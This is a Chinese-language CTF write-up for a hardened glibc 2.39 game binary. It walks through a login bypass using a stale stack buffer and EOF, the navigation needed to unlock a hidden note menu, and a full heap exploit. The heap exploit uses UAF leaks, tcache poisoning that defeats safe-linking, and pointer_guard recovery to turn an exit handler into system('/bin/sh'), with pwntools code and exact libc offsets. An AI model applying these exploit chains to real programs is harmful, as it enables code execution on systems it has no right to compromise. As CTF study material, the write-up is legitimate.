
## 0. 题目基本信息

### 二进制保护机制 (checksec)

```
$ python -c "from pwn import *; ELF('./package/pwn', checksec=True)"
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
FORTIFY:  Enabled
SHSTK:    Enabled
IBT:      Enabled
```

程序的各项安全保护机制已全面开启，这意味着传统的栈溢出或直接覆盖 GOT 表的攻击手法将无法奏效。

### 运行环境分析

- 本程序为一个动态链接的 C++ 应用，附件中已包含配套的 `ld-linux-x86-64.so.2`、`libc.so.6` 以及 `libstdc++.so.6`。
- 目标 Libc 版本为: **Ubuntu GLIBC 2.39-0ubuntu8.7**
- 本地启动命令: `./package/ld-linux-x86-64.so.2 --library-path ./package ./package/pwn`

### 官方提供的 3 条提示 (Hint)

1. 堆管理相关的菜单存在潜在漏洞。
2. 重点关注登录验证环节，弄清楚缓冲区数据在何时会被清理。
3. 游戏内的寻路算法与常规的深度优先搜索 (DFS) 有所区别。

---

## 1. 第一阶段：利用缓冲区残留绕过登录

### 1.1 漏洞成因分析

当程序启动时，会执行以下流程：

1. `init()` 函数利用 MT19937 伪随机数生成算法，生成长度为 31 字节的**可见字符**密码。
2. 程序为 `test` 和 `pl1` 这两个内置账户分别设置密码，并将其保存在栈内存的 `[rsp+0x90]` 位置。
3. 随后，程序会提示输入“启动用户名/密码” —— **此处系统直接复用了刚才的栈空间 `[rsp+0x90]`**。
4. 程序内部自定义的输入读取函数单次最多只能接收 31 字节，并且仅在识别到 `\n` 时才会截断输入。

**关键漏洞所在**：该输入函数在执行读取前**并未对缓冲区进行清零**。如果我们在此时发送 Ctrl-D（触发 EOF），`read()` 的返回值为 0，从而导致缓冲区内原有的数据原封不动地保留下来。

在后续的登录验证中，`memcmp(input, stored_password_hash)` 会将缓冲区当前的内容与初始化时保存的哈希作对比。只要我们能让缓冲区里残留着当初生成的原始密码，就能顺利通过校验。

### 1.2 具体利用手段（首选 Ctrl-D 技巧）

```
步骤 1: 提示输入启动用户名时 → 可随意输入（例如发送 "hacker\n"）
步骤 2: 提示输入启动密码时   → 直接发送 Ctrl-D（由于 read() 返回 0，缓冲区中依然存留着 pl1 的密码）
步骤 3: 在主菜单界面选择 1   → 进入登录流程
步骤 4: 提示输入用户名时     → 发送 "pl1\n"
步骤 5: 提示输入密码时       → 再次发送 Ctrl-D（此时缓冲区内依然是 pl1 账户的原始密码）
步骤 6: memcmp 校验通过     → 成功绕过登录，以 pl1 的身份进入游戏世界
```

### 1.3 备选方案：单字节爆破法（WP 原思路）

```
步骤 1: 提示输入启动用户名时 → 发送 "X\n"
步骤 2: 提示输入启动密码时   → 仅发送 "\n"（即空密码，只包含换行符）
步骤 3: 在主菜单界面选择 1   → 进入登录流程
步骤 4: 提示输入用户名时     → 发送 "pl1\n"
步骤 5: 提示输入密码时       → 仅发送 1 个字节的数据（注意不要附带换行符）
  原理: 这样做只会覆盖掉缓冲区的第 0 个字节，而第 1~30 字节依然保留着 pl1 的原始密码。
  代价: 最多需要尝试 256 次（由于密码是可见字符，实际尝试次数大约在 95 次以内）。
  优势: 如果失败，可以在同一个连接会话中不断重试，每次只需更换第 0 个字节的值即可。
```

### 1.4 核心交互代码

```python
io.recvuntil(b':')
io.sendline(b'hacker')          # startup username
io.recvuntil(b':')
time.sleep(0.1)
io.send(b'\x04')                # Ctrl-D → read() returns 0
time.sleep(0.3)
io.recvuntil(b'5.')             # wait for main menu
io.sendline(b'1')               # Login
io.recvuntil(b':')
io.sendline(b'pl1')
io.recvuntil(b':')
time.sleep(0.1)
io.send(b'\x04')                # Ctrl-D again
```

---

## 2. 第二阶段：从游戏地图导航至月球以触发 Note 菜单

### 2.1 岛屿机制解析

游戏在内部维护着 64 个岛屿节点的坐标，控制游戏进程的核心状态数据均存储于栈上：

```
[rsp+0x330] = 当前所处位置 (island index, 范围 0-63)
[rsp+0x334] = 拥有的材料数量 (初始值为 400)
[rsp+0x32C] = 目前已解锁的岛屿总数
```

每个岛屿在运行时的结构体大小为 0x50 字节，其内存布局如下:
```
[+0x00] x, y 坐标
[+0x10] w2 (byte)
[+0x11] visible (byte, 0代表隐藏, 1代表可见)
[+0x14] event_type (int)
[+0x18] 资源获取与消耗数值
[+0x30] 指向名称字符串的指针 (UTF-8 编码)
[+0x38] 指向描述文本的指针
[+0x48] hash (44-bit SHA-256)
```

### 2.2 核心岛屿与触发事件

| 岛屿名称 | 索引编号 | event_type | 触发后产生的效果 |
|------|------|-----------|---------|
| Data Reef | 14 (初始模板岛屿) | 7 | 将 `moon.visible` 的值设为 `1` |
| superadmin | 隐藏列表 [14] | 8 | 提供免费建桥功能，可直达月球 |
| 月球 | 63 | - | 激活隐藏的 note 交互菜单 (`0xBF20`) |
| 地堡 | 隐藏列表 [2] | 2 | 奖励 300 点材料 |
| 漂流木堆 | 隐藏列表 [8] | 2 | 奖励 200 点材料 |

### 2.3 菜单功能概览

```
主菜单层级:
  1. 导航到岛屿（展示当前可以移动到达的岛屿列表）
  2. 建造桥梁
  3. 登录子账户
  4. 自动寻路
  5. 探索 → 展开子菜单
      1. 随机探索
      2. 根据传说搜寻 → 只要输入正确的岛屿名称，即可直接解锁对应岛屿！
  6. 查看状态（包括剩余材料、已解锁数量、当前坐标）
  7. 返回上一级

隐藏的 Note 菜单 (需抵达月球方可激活):
  1. add note
  2. delete note
  3. view note
  4. edit note
```

### 2.4 寻路通关步骤（共 5 步）

```
Step 1: 前往 Data Reef
  首先搭建通往 Data Reef 的桥梁（它是初始的 16 个岛屿之一）
  → 操控角色移动至 Data Reef → 激活 Event 7
  → 此时 moon.visible = 1（代表月球已成功解锁！）

Step 2: 通过传说搜寻找出 superadmin 岛
  进入菜单 5（探索）→ 选择 2（根据传说搜寻）
  → 输入目标名称 "superadmin"
  → 系统扣除 100 材料，并将 superadmin 岛从隐藏列表中具现化

Step 3: 铺设前往 superadmin 的桥梁并进行移动
  若当前材料余额不足，可先前往花费较低的岛屿进行探索（每次发现新岛屿均可获得 200 材料补贴）
  触发地堡的 Event 2 可获 300 材料，漂流木堆则提供 200 材料

Step 4: 在 superadmin 岛上进行探索 → 激活 Event 8
  进入菜单 5（探索）→ 当系统提示输入“目标岛屿名”时
  → 键入 "月球"
  → 触发 Event 8，系统将为你免费铺设连接月球的桥梁

Step 5: 登月
  程序检测到当前 position==63 且 moon.visible!=0 时
  → 自动调用 note 菜单处理函数 (0xBF20)
  → 成功切入 UAF 漏洞利用环节
```

### 2.5 游戏进程交互演示

```
>>> 2                # 建造桥梁
1. Echo Base (消耗: 52)
2. Data Reef (消耗: 128)
...
请选择: 2
建造成功！消耗 128 材料

>>> 1                # 导航到岛屿
1. Data Reef (距离: 0)
请选择: 1
你到达了 Data Reef
一座古老的数据中心...
你发现了登月计划的资料！月球已被解锁。

>>> 5                # 探索
2. 随机探索
3. 根据传说搜寻
请选择: 2
请输入岛屿名: superadmin
传说指引你解锁了 superadmin！坐标: (15420, 8320)
```

---

## 3. 第三阶段：堆漏洞利用 — 结合 UAF 与 tcache poisoning 劫持 exit handler

### 3.1 Note 菜单中的缺陷

Note 管理系统内部维护了一个容量为 16 的数组，允许分配的最大 note 尺寸为 `0x800`：

| 执行操作 | 底层代码实现 | 存在的安全隐患 |
|------|------|------|
| `add(idx, size)` | `notes[idx] = new char[size]` | 无明显异常 |
| `delete(idx)` | `delete[] notes[idx]` | **未将 notes[idx] 的指针置空 (NULL)** → 导致 UAF |
| `view(idx)` | `write(1, notes[idx], size)` | 允许读取已被释放的内存 → **造成信息泄露** |
| `edit(idx)` | `read(0, notes[idx], size)` | 允许向已被释放的内存写入数据 → **形成 UAF 任意写** |

综上所述，该模块同时暴露了 UAF 读、UAF 写以及 double free（即对同一个槽位执行多次释放）的攻击面。

### 3.2 核心 libc 偏移量 (针对 glibc 2.39-0ubuntu8.7)

```
libc 关键偏移 (均已通过验证):
  UNSORTED_OFF     = 0x203B20   // main_arena.bins[0] = &unsorted_bin
  EXIT_FUNCS_OFF   = 0x203680   // __exit_funcs 指针的存放位置 → &initial
  EXIT_NODE_OFF    = 0x204FC0   // initial exit_function_list 的起始位置
  system           = 0x58750
  /bin/sh          = 0x1CB42F

libstdc++ 相关偏移:
  EXIT_ENTRY1_DSO  = 0x279100
  EXIT_ENTRY1_FUNC = 0xB8DA0
```

关于偏移的验证思路:
```python
# __exit_funcs 验证: 在 libc 中搜索指向 0x204FC0 的指针
# 唯一引用在 0x203680 → 确认 __exit_funcs → &initial
```

### 3.3 详细漏洞利用步骤

#### 步骤 1：通过 unsorted bin 泄露 libc 基址

```python
add(0, 0x500)        # 大于 tcache 最大 bin (0x410) → 将来 free 进 unsorted bin
add(15, 0x20)        # guard chunk，防止与 top chunk 合并
delete(0)            # 进入 unsorted bin
leak = u64(view(0)[:8])    # fd 指针 → main_arena + 0x60
libc_base = leak - 0x203B20
```

#### 步骤 2：利用 tcache poisoning（绕过 safe-linking 并构造 double free）

在 glibc 2.39 版本中引入了 safe-linking 防护机制：存储的 `fd = (real_ptr ^ (chunk_addr >> 12))`。
同时，tcache 结构在 chunk 的 bk 偏移处设有一个 tcache key，专门用来防范 double free。

针对此防护的绕过策略是：先利用 UAF 的 `edit` 功能抹除 tcache key，随后再次执行 free。

```python
# a) 分配两个 0x20 chunk
add(a, 0x20); add(b, 0x20)

# b) 放入 tcache: b → a
delete(a); delete(b)

# c) UAF 读 → 泄 safe-linked fd → 解码得 chunk_a 堆地址
chunk_a = demangle(u64(view(b)[:8]))
chunk_b = chunk_a + 0x20 + 0x10  # data + chunk header

# d) UAF 写 → 清 tcache key（bk 位置 = user_data+8）
edit(b, b'B'*8 + p64(0) + b'C'*(size-16))

# e) 再次 free → double free 成功: tcache → b → b → a
delete(b)

# f) 分配两次，都拿到 chunk b
add(c, 0x20); add(d, 0x20)

# g) 将 c 放回 tcache: tcache → c → b → b → ...
delete(c)

# h) 修改 d（即 chunk b）的 fd → poisoned = target ^ (chunk_b >> 12)
edit(d, p64(poisoned) + p64(0) + b'D'*(size-16))

# i) 两次分配 → 第二个分配落在 target
add(e, 0x20); add(f, 0x20)   # f → target!
```

safe-linking 保护机制对应的逆向解码逻辑如下:
```python
def demangle(enc):
    x = enc
    for _ in range(6):
        x = enc ^ (x >> 12)
    return x
```

#### 步骤 3：泄露 pointer_guard 的值

`exit_function_list` 的节点结构如下：

```
[+0x00] next           (8 bytes, 指向链表中的下一个节点)
[+0x08] idx            (4 bytes, 记录当前激活的 entry 数量)
[+0x0C] padding        (4 bytes)
[+0x10] entry[0]       (每个 entry 占用 0x20 bytes)
[+0x30] entry[1]
...
```

其中单个 entry (占用 0x20 字节) 的内部布局为:
```
[+0x00] flavor (4 bytes: 若为 4 则代表 ef_cxa)
[+0x04] padding
[+0x08] func   (8 bytes, 经过 PTR_MANGLE 加密混淆的函数指针)
[+0x10] arg    (8 bytes)
[+0x18] dso    (8 bytes)
```

**核心利用技巧**：务必让分配到的 chunk 地址落在 `node + 0x20` 处（切忌落在 `+0x00` 处）：
- 当 `tcache_get` 成功返回内存时，会强制将用户数据区的前 8 个字节清零。
- 若地址分配在 `node + 0x00`，清零操作会破坏 `next` 指针，导致整个链表断裂失效。
- 若将目标锁定为 `node + 0x20`，清零动作只会覆盖 `entry[0].dso`，从而保证 `idx` 与 `next` 字段安然无恙。

将数据读出后，可借此推算出 entry1 中的加密函数指针与 DSO 值:
```python
ptr_guard = ror64(entry1_enc, 17) ^ (libstdc_base + 0xB8DA0)
```

#### 步骤 4：篡改 exit entry 指向 system("/bin/sh")

```python
entry12_addr = node + 0x190
slot_w, _ = tcache_poison(7, entry12_addr, 0x20)

encoded = rol64(system_addr ^ ptr_guard, 17)
payload = flat(4, encoded, binsh_addr, 0)
edit(slot_w, payload)   # entry12 → system("/bin/sh")
```

#### 步骤 5：触发 exit 调用流程

```python
menu(9)  # 随意输入一个无效的菜单选项 → 触发 exit() → 继而调用 __run_exit_handlers
         # → 系统开始遍历 exit_function_list → 最终执行被我们注入的 system("/bin/sh")
```

### 3.4 为何选择劫持 exit handler 而非 __free_hook

在 glibc 2.39 的底层设计中：
- 尽管 `__free_hook` 这个符号依然存在于内存 `0x20A148` 处。
- 但是，新版 `free()` 函数的内部逻辑已经彻底移除了对 `__free_hook` 的检测与调用流程。
- 然而，当程序调用 `exit()` 后进入 `__run_exit_handlers` 时，系统仍然会顺着 `__exit_funcs` 链表执行里面登记的所有函数。
- 故而在 2.39 环境下，劫持 exit handler 成为了非常可靠的攻击路径。

### 3.5 pointer mangling 保护机制分析

为了防止攻击者篡改 `exit_function_list` 中的关键函数指针，glibc 运用了 `PTR_MANGLE` 宏来进行混淆保护：

```
编码操作: enc = rol(func ^ pointer_guard, 0x11)
解码操作: func = ror(enc, 0x11) ^ pointer_guard
```

这里的 `0x11`（即十进制的 17）代表了位移参数。

加密所需的密钥 `pointer_guard` 被存放在了 TLS 区域中（具体位置为 `fs:0x30`），由于无法直接通过内存读取，我们采取了如下的破解思路：
1. 观察到 libc 在初始化阶段，会利用 `__cxa_atexit` 自动注册 libstdc++ 的析构函数。
2. 我们已通过越权读取拿到了 entry1 的 `enc` 值，同时其 `dso` 暴露了 libstdc++ 的基地址。
3. 结合 libstdc++ 基址与预知的固定偏移量，我们就能推算得出原始的函数地址（func）。
4. 最后带入公式 `ptr_guard = ror(enc, 17) ^ func`，即可反推并解密出系统隐藏的 pointer_guard。

---

## 4. 全套攻击流程与复现指南

### 4.1 环境准备与检查

```bash
# 核对文件目录架构
ls package/
# pwn  ld-linux-x86-64.so.2  libc.so.6  libgcc_s.so.1  libm.so.6  libstdc++.so.6

# 检验 Python 依赖库
python -c "from pwn import *; print('pwntools OK')"

# 核实当前加载的 libc 版本
strings package/libc.so.6 | grep "GLIBC 2.39"
# → GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.7) stable release version 2.39.
```

### 4.2 自动化执行脚本

```bash
# 本地调试运行（要求配置有 Linux 或 WSL 环境）
# 请先在 exp_full.py 中将配置项修改为 LOCAL = True
python exp_full.py

# 针对远程服务器发起攻击（默认配置）
python exp_full.py
# 或者是使用
python exp_full.py REMOTE
```

### 4.3 纯手工分阶段复现指令

**第一阶段：攻破登录限制**
```bash
python -c "
from pwn import *
context.log_level = 'info'
io = process(['./package/ld-linux-x86-64.so.2', '--library-path', './package', './package/pwn'],
             stdin=PTY, stdout=PTY, stderr=PTY)
# 交互式测试 Ctrl-D 绕过
import time
io.recvuntil(b':')
io.sendline(b'hacker')
io.recvuntil(b':')
time.sleep(0.1); io.send(b'\x04')
time.sleep(0.3)
io.recvuntil(b'5.')
io.sendline(b'1')
io.recvuntil(b':')
io.sendline(b'pl1')
io.recvuntil(b':')
time.sleep(0.1); io.send(b'\x04')
time.sleep(0.5)
print(io.recv(timeout=2))
io.interactive()
"
```

**第二阶段：岛屿地图寻路**
```bash
# 顺利进入 game 主菜单后，请按照下述顺序敲击键盘:
# 2 → 选择目标 Data Reef 搭建桥梁 → 1 → 执行移动操作，抵达 Data Reef
# 5 → 2 → 输入 "superadmin" → 借由传说机制将其激活
# 2 → 搭建通往 superadmin 的桥梁 → 1 → 执行移动操作，抵达 superadmin
# 5 → 针对 superadmin 展开探索 → 当提示出现时输入 "月球"
# 1 → 执行移动操作前往月球 → 此时屏幕应弹出 "add note" 界面
```

**第三阶段：堆结构利用测试**
```bash
# 成功调出 note 菜单后，可通过以下指令手动验证漏洞情况:
# 1 → 0 → 1280 → (分配一个大小为 0x500 的 chunk)
# 1 → 15 → 32 → (分配 guard chunk 防止合并)
# 2 → 0 → (执行 delete 操作 → 目标坠入 unsorted bin)
# 3 → 0 → (执行 view 操作 → 屏幕上应当能看到泄露出的 libc 内存地址)
```